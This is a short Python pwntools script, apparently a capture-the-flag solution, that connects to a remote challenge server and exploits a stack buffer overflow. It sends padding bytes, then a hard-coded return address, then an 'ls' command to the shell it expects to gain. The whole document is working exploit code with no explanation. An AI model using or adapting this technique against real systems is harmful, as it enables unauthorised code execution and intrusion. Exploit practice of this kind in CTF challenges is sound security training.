from pwn import *
p = remote('ctf.rbp.rip', 9006)

print(p.recv(2048))

p.send(b'A'*0x40)
p.send(b'B'*0x8)

p.send(b'\xa8\x12\x40\x00')
p.send(b'ls')

print(p.recv(1024))
